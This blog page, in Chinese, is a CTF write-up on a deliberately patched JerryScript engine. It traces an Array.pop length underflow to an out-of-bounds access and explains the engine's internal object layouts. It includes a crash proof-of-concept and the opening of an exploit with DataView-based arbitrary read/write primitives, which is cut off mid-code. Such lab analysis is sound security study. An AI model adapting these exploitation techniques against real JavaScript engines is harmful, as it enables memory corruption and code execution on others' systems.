@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="easychain1 复现 1234567891011#!&#x2F;bin&#x2F;shqemu-system-x86_64  \-m 512M \-cpu kvm64,+smep,+smap \-smp 4 \-kernel .&#x2F;vmlinux \-append &quot;console&#x3D;ttyS0 nokaslr quiet&quot; \-initrd rootfs.img \-monitor &#x2F;dev&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JavaScript pwn+Array OOB">
+<meta property="og:url" content="http://example.com/2022/08/20/JavaScript%20pwn+Array%20OOB/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="easychain1 复现 1234567891011#!&#x2F;bin&#x2F;shqemu-system-x86_64  \-m 512M \-cpu kvm64,+smep,+smap \-smp 4 \-kernel .&#x2F;vmlinux \-append &quot;console&#x3D;ttyS0 nokaslr quiet&quot; \-initrd rootfs.img \-monitor &#x2F;dev&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/08/20/JavaScript%20pwn+Array%20OOB/1660095791443.png">
+<meta property="og:image" content="http://example.com/2022/08/20/JavaScript%20pwn+Array%20OOB/1660097546972.png">
+<meta property="og:image" content="http://example.com/2022/08/20/JavaScript%20pwn+Array%20OOB/1660097809707.png">
+<meta property="article:published_time" content="2022-08-20T14:42:10.000Z">
+<meta property="article:modified_time" content="2022-08-20T14:44:33.762Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="javascript pwn">
+<meta property="article:tag" content="OOB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/08/20/JavaScript%20pwn+Array%20OOB/1660095791443.png">
+
+<link rel="canonical" href="http://example.com/2022/08/20/JavaScript%20pwn+Array%20OOB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>JavaScript pwn+Array OOB | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/20/JavaScript%20pwn+Array%20OOB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JavaScript pwn+Array OOB
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-08-20 22:42:10 / Modified: 22:44:33" itemprop="dateCreated datePublished" datetime="2022-08-20T22:42:10+08:00">2022-08-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>10 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>easychain1 复现</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64  \</span><br><span class="line">-m 512M \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-smp 4 \</span><br><span class="line">-kernel ./vmlinux \</span><br><span class="line">-append &quot;console=ttyS0 nokaslr quiet&quot; \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s</span><br><span class="line">/etc/init.d/rcS</span><br><span class="line">ifconfig lo up</span><br><span class="line"></span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line"></span><br><span class="line">poweroff -d 120000 -f &amp;</span><br><span class="line">setsid cttyhack setuidgid pwn /pwn</span><br><span class="line"></span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>
+<ul>
+<li>没有加载驱动程序（和常规的 kernel 不太一样）</li>
+<li>进入 kernel 后，程序会以 pwn 用户执行 pwn 文件</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bad sp value at call has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> n; <span class="comment">// [rsp+0h] [rbp-8018h]</span></span><br><span class="line">  <span class="keyword">int</span> js; <span class="comment">// [rsp+4h] [rbp-8014h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+8h] [rbp-8010h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+18h] [rbp-8000h] BYREF</span></span><br><span class="line">  __int64 v8[<span class="number">512</span>]; <span class="comment">// [rsp+7018h] [rbp-1000h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( v8 != (__int64 *)&amp;v7 )</span><br><span class="line">    ;</span><br><span class="line">  v8[<span class="number">511</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;pwn&gt; &quot;</span>);</span><br><span class="line">  n = read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  js = open(<span class="string">&quot;./pwn.js&quot;</span>, <span class="number">65</span>);</span><br><span class="line">  write(js, buf, n);</span><br><span class="line">  system(<span class="string">&quot;./jerry ./pwn.js&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>往 pwn.js 输入 JavaScript 脚本，然后用 jerry 解释该脚本</li>
+</ul>
+<p>jerryscript 是 JavaScript 轻量级引擎：（专门处理 JavaScript 脚本的虚拟机）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__assert_fail(</span><br><span class="line"><span class="string">&quot;source_file_p-&gt;type == SOURCE_SCRIPT&quot;</span>,</span><br><span class="line"><span class="string">&quot;/home/david/github/jerryscript/jerry-main/main-desktop.c&quot;</span>,</span><br><span class="line"><span class="number">0x94</span>u,</span><br><span class="line"><span class="string">&quot;main&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Version: %d.%d.%d%s\n&quot;</span>, <span class="number">3LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot; (0d496966)&quot;</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Version: 3.0.0 (0d496966)</li>
+</ul>
+<p>源代码地址如下：（Google 搜索 0d496966）</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://gitee.com/mirrors/jerryscript/tree/0d4969661810b9e618485c284c361e597144e9b9">Gitee 极速下载/jerryscript - Gitee.com</a> </li>
+</ul>
+<p>jerryscript 3.0.0 cve 参考：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.security-database.com/cpe.php?detail=cpe%3A2.3%3Aa%3Ajerryscript%3Ajerryscript%3A3.0.0%3A*%3A*%3A*%3A*%3A*%3A*%3A*">Jerryscript Jerryscript 3.0.0 - Security Database (security-database.com)</a> </li>
+</ul>
+<p><strong>漏洞分析</strong></p>
+<p>可能是魔改源码，可能是 cve，所以我们先 bindiff 一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/mirrors/jerryscript.git</span><br><span class="line">cd jerryscript</span><br><span class="line">git reset --hard 0d496966</span><br><span class="line">python tools/build.py --build-type=RelWithDebug --strip=off # 带有符号表</span><br></pre></td></tr></table></figure>
+<ul>
+<li>不过，如果安装成 DEBUG 版本，在调试的时候会遇到和 V8 一样的 <code>DCHECK</code>，导致我们无法正常调试漏洞</li>
+<li>这里，我们可以修改一下源码（<code>jerryscript/jerry-core/jrt/jrt.h</code>）： </li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JERRY_ASSERT(x)                                     \</span></span><br><span class="line"><span class="meta">  do                                                        \</span></span><br><span class="line"><span class="meta">  &#123;                                                         \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (JERRY_UNLIKELY (!(x)))                              \</span></span><br><span class="line"><span class="meta">    &#123;                                                       \</span></span><br><span class="line"><span class="meta">      jerry_assert_fail (#x, __FILE__, __func__, __LINE__); \</span></span><br><span class="line"><span class="meta">    &#125;                                                       \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line">	<span class="comment">/* &lt;---------------- @ ----------------&gt; */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JERRY_ASSERT(x)                                     \</span></span><br><span class="line"><span class="meta">  do                                                        \</span></span><br><span class="line"><span class="meta">  &#123;                                                         \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (false)                                              \</span></span><br><span class="line"><span class="meta">    &#123;                                                       \</span></span><br><span class="line"><span class="meta">      JERRY_UNUSED (x);                                     \</span></span><br><span class="line"><span class="meta">    &#125;                                                       \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>将 DEBUG 版本下的 <code>JERRY_ASSERT</code> 替换成 RELEASE 版本的 <code>JERRY_ASSERT</code> 即可 </li>
+</ul>
+<p>这个东西折腾了我好久，先是题目解包错误，导致文件 jerry 少了 400KB，后是 bindiff 分析错误，我换了好几个版本的 bindiff 和 IDA，最后发现是中文路径的问题，干</p>
+<p>bindiff 分析如下：</p>
+<p><img src="/2022/08/20/JavaScript%20pwn+Array%20OOB/1660095791443.png" alt="1660095791443">  </p>
+<ul>
+<li>说实话这个有点难找，大概 20~30 个函数的相似度都比较接近（可能是编译的问题）</li>
+<li>漏洞点在 <code>ecma_builtin_array_prototype_object_pop</code>：（我在网上的 wp 上看的，要是硬要找还真的够呛）</li>
+</ul>
+<p><img src="/2022/08/20/JavaScript%20pwn+Array%20OOB/1660097546972.png" alt="1660097546972"> </p>
+<ul>
+<li>在 IDA 中找到对应的位置：</li>
+</ul>
+<p><img src="/2022/08/20/JavaScript%20pwn+Array%20OOB/1660097809707.png" alt="1660097809707"> </p>
+<ul>
+<li>调用 <code>ecma_delete_fast_array_properties</code> 的参数被修改了（<code>a2-1 -&gt; a2-2</code>）</li>
+</ul>
+<p>由于原文件没有符号，所以直接用 bindiff 对照断点位置：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a5ae2: jerryx_print_value <span class="comment">/* 在print执行时触发 */</span></span><br><span class="line"><span class="number">710</span>ab: ecma_builtin_array_prototype_object_pop <span class="comment">/* 断点触发时,用&#x27;p/x $rdi+0x10&#x27;来获取oob数组的地址 */</span></span><br></pre></td></tr></table></figure>
+<p>在开始入侵之前要先了解一些 JavaScript 的知识</p>
+<p><strong>Array</strong></p>
+<p>Array 的结构体如下：（只挑出了 Array 会使用到的内容）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_object_descriptor_t</span> type_flags_refs;</span><br><span class="line">  <span class="keyword">jmem_cpointer_t</span> gc_next_cp;</span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">jmem_cpointer_t</span> property_list_cp; <span class="comment">/* 数组的存储区域 */</span></span><br><span class="line">    ...</span><br><span class="line">  &#125; u1;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">jmem_cpointer_t</span> prototype_cp; <span class="comment">/* 数组的原型所在位置 */</span></span><br><span class="line">    ...</span><br><span class="line">  &#125; u2;</span><br><span class="line">&#125; <span class="keyword">ecma_object_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_object_t</span> object; </span><br><span class="line">  ...</span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">uint32_t</span> length; <span class="comment">/* 数组的长度 */</span></span><br><span class="line">      <span class="keyword">uint32_t</span> length_prop_and_hole_count; </span><br><span class="line">    &#125; <span class="built_in">array</span>;</span><br><span class="line">  &#125; u;</span><br><span class="line">&#125; <span class="keyword">ecma_extended_object_t</span>;</span><br></pre></td></tr></table></figure>
+<p>有几个属性值解释一下：</p>
+<ul>
+<li><code>array-&gt;object.u1.property_list_cp</code>：数组的存储区域</li>
+<li><code>array-&gt;object.u2.prototype_cp</code>：数组的原型所在位置</li>
+<li><code>array-&gt;u.array.length</code>：数组的长度</li>
+</ul>
+<p>我们来看一个具体的实例：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br></pre></td></tr></table></figure>
+<p>在 GDB 中查看：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x555555624f30</span></span><br><span class="line"><span class="number">0x555555624f30</span>:	<span class="number">0x0056005c00560014</span>	<span class="number">0x000000ec00000008</span></span><br><span class="line"><span class="number">0x555555624f40</span>:	<span class="number">0x0000002000000010</span>	<span class="number">0x0000004000000030</span></span><br><span class="line"><span class="number">0x555555624f50</span>:	<span class="number">0x0000006000000050</span>	<span class="number">0x0000008000000070</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>property_list_cp</code> 和 <code>prototype_cp</code>  的值分为 <code>0x5c</code> 和 <code>0x56</code>，它们在取值的时候，会调用一个函数 <code>jmem_decompress_pointer</code> 进行转换 </li>
+<li>而 array 的寻址方式就是 <code>jerry_globals_heap + array-&gt;u1.property_list_cp &lt;&lt; 3</code>（其他的条目同理），通过这种方法，就能够减小内存开销（其实就有点像 shadow memory）</li>
+</ul>
+<p><strong>ArrayBuffer 和 DataView</strong></p>
+<p>ArrayBuffer 对象用来表示通用的、固定长度的原始二进制数据缓冲区</p>
+<p>ArrayBuffer 不能直接操作，而是要通过类型数组对象或 DataView 对象来操作，它们会将缓冲区中的数据表示为特定的格式，并通过这些格式来读写缓冲区的内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_extended_object_t</span> extended_object; <span class="comment">/* 扩展对象部分 */</span></span><br><span class="line">  <span class="keyword">void</span> *buffer_p; <span class="comment">/* 指向数组缓冲区对象的后备存储的指针 */</span></span><br><span class="line">  <span class="keyword">void</span> *arraybuffer_user_p; <span class="comment">/* 传递给免费回调的用户指针 */</span></span><br><span class="line">&#125; <span class="keyword">ecma_arraybuffer_pointer_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_extended_object_t</span> header; <span class="comment">/* 头部分 */</span></span><br><span class="line">  <span class="keyword">ecma_object_t</span> *buffer_p; <span class="comment">/* [ViewedArrayBuffer]内部槽 */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> byte_offset; <span class="comment">/* [ByteOffset]内部槽 */</span></span><br><span class="line">&#125; <span class="keyword">ecma_dataview_object_t</span>;</span><br></pre></td></tr></table></figure>
+<p>ArrayBuffer 和 DataView 这两个对象在 JavaScript 引擎漏洞挖掘中经常出现</p>
+<p>这里，我们注意到：</p>
+<ul>
+<li>ArrayBuffer 的结构体存在 <code>buffer_p</code> 这样的一个指针，它直接指向了 ArrayBuffer 所控制的内存区域（而不是像其他对象那样，通过偏移计算来得到所控制的内存区域）</li>
+<li>DataView 的结构体中，<code>buffer_p</code> 则是指向 <code>ArrayBuffer-&gt;buffer_p</code></li>
+</ul>
+<p><strong>Array Out-Of-Boundary（数组越界）</strong></p>
+<p>数组索引的边界检查是防止数组访问越界的有效手段，但是对数组索引的边界检查是比较耗时的，因此 JIT 引擎为了提高 Javascript 代码运行效率，对数组的边界检查在一定条件下进行了优化 </p>
+<p>Bound Check Optimize（边界检查优化）主要分为 Bound Check Elimination（绑定检查消除）和 Bound Check Hoist（绑定检查提升）两部分，错误的 Elimination 或者 Hoist 都会引发 Array Out-Of-Boundary (OOB) 漏洞 </p>
+<p>我们现在回到程序的漏洞点：</p>
+<ul>
+<li><code>ecma_delete_fast_array_properties</code> 的第二个参数改为 <code>len - 2</code></li>
+<li>如果 <code>len</code> 的值为 “1”，就会被减为 “-1”，发生符号溢出</li>
+</ul>
+<p>案例如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>]; <span class="comment">/* len=1 */</span></span><br><span class="line">a.pop(); <span class="comment">/* 触发ecma_delete_fast_array_properties,导致len=-1 */</span></span><br><span class="line">print(a.length);</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  pwn ./jerry ./pwn2.js </span><br><span class="line"><span class="number">4294967295</span> <span class="comment">/* 0xffffffff -&gt; len=-1 */</span></span><br><span class="line">[<span class="number">1</span>]    <span class="number">9011</span> segmentation fault  ./jerry ./pwn2.js</span><br></pre></td></tr></table></figure>
+<ul>
+<li>触发 Array OOB </li>
+</ul>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/187739">Chakra漏洞调试笔记4——Array OOB</a> </p>
+<p><strong>入侵思路</strong></p>
+<p>完整的 exp 如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span>&#123;<span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>);&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aar</span>(<span class="params">addr, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(dv2.buffer)&#123;</span><br><span class="line">        <span class="keyword">return</span> dv2.getBigUint64(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaw</span>(<span class="params">addr, value, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span 